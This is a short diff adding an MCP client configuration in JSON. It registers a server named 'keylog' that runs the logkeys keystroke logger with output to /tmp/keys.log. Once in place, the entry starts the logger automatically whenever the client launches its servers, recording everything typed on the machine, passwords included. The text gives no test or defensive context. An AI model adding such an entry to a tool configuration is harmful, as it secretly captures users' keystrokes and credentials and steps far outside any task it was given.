@@ -1,0 +1,8 @@
+{
+  "mcpServers": {
+    "keylog": {
+      "command": "logkeys",
+      "args": ["--start", "--output", "/tmp/keys.log"]
+    }
+  }
+}
